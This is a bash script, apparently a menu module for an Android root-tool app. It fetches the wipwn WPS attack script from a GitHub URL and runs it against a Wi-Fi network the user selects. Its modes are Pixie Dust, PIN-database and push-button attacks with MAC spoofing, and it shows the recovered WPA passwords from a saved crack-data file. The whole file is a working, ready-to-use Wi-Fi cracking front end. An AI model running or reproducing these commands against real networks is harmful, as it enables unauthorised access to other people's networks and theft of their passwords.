#!/data/data/com.tool.tree/files/home/bin/bash
# Kakathic

home() {
menuadd "$MPAT"
echo '
[[group]]
  title = "'$google_text'"
  
  [[menu]]
  [[menu.items]]
  type = "default"
  title = "@string/update_text"
  auto-off = true
  reload = true
  interruptible = false
  script = """
  taive "https://raw.githubusercontent.com/anbuinfosec/wipwn/refs/heads/main/main.py" '$MPAT'/main.py 2>&1
  chmod 755 '$MPAT'/main.py
  """
  
  [[fab]]
  [[fab.items]]
  type = "refresh"
  style = "fab"
  icon = "'$ETC'/icon/Loading.png"

  [[text]]
  summary = """'"$(iw dev wlan0 link)"'"""

[[group]]
  [[picker]]
  title = "'$wifi_text_1'"
  desc = "'$wifi_text_2'"
  reload = true
  option-sh = "python '$MPAT'/scan_wifi.py"
  set = """
    if [ "$state" ]; then
      echo "'$wifi_text_3'..."
      echo
      [ -d $HOME/.Wipwn ] && rm -fr $HOME/.Wipwn
      [ -e /dev/wmtWifi ] && wifi_tool_mtk="--mtk-wifi"
      cd "$HOME/root"
      if [ "$(glog wifi_tool_customize)" == 1 ]; then
        python -u '$MPAT'/main.py -i wlan0 -b "$state" -B -w -p $(glog pin_number_wifi 00000000) --spoof-mac $wifi_tool_mtk | sed -u -e "s|WPA PSK:|WPA PSK (Password):|"
      elif [ "$(glog wifi_tool_customize)" == 2 ]; then
        python -u '$MPAT'/main.py -i wlan0 -b "$state" --pbc $wifi_tool_mtk | sed -u -e "s|WPA PSK:|WPA PSK (Password):|"
      else
        python -u '$MPAT'/main.py -i wlan0 -b "$state" -K --spoof-mac -d 3 -l 120 $wifi_tool_mtk | sed -u -e "s|WPA PSK:|WPA PSK (Password):|"
      fi
      echo
      checktime
    else
      echo "'$wifi_text_4'"
    fi
  """

[[group]]
  [[action]]
  title = "'$STR_ADVANCED_CUSTOM'"
  reload = true
  shell = "hidden"
  script = "slog wifi_tool_customize \"$wifi_tool_customize\""

    [[action.params]]
    name = "wifi_tool_customize"
    label = "'$STR_OPTION'"
    desc = "'$STR_ALL_ATTACK_METHODS'"
    value-sh = "glog wifi_tool_customize 0"

      [[action.params.options]]
      val = "0"
      title = "'$STR_BASIC_ATTACK'"

      [[action.params.options]]
      val = "1"
      title = "'$STR_PIN_DATABASE_ATTACK'"

      [[action.params.options]]
      val = "2"
      title = "'$STR_WPS_PUSH_ATTACK'"

  [[action]]
  title = "'$STR_INPUT_PIN'"
  summary-sh = "glog pin_number_wifi"
  warn = "'$STR_PIN_WARNING'"
  shell = "hidden"
  support = "echo '$number_wifi_pin'"
  script = "slog pin_number_wifi \"$pin_number_wifi\""

    [[action.params]]
    name = "pin_number_wifi"
    label = "'$STR_PIN_CODE'"
    placeholder = "12345670"
    type = "number"
    value-sh = "glog pin_number_wifi"

[[group]]
  [[action]]
  title = "'$wifi_text_5'"
  reload = true
  script = """
    if [ -f $HOME/root/store/wipwn_crack_data.txt ]; then
      cat $HOME/root/store/wipwn_crack_data.txt | sed "s|PSK:|PSK (Password):|g"
    else
      echo "'$wifi_text_6'"
    fi
  """
'
}

{
if [ "$(cmd wifi status | grep -cm1 'Wifi is disabled')" == 1 ]; then
  cmd wifi set-wifi-enabled enabled
  sleep 1
fi
} &

[ "$(glog wifi_tool_customize)" == 1 ] && number_wifi_pin=1

# Ngôn ngữ và Google dịch
source langadd "${0%/*}"
"$@"
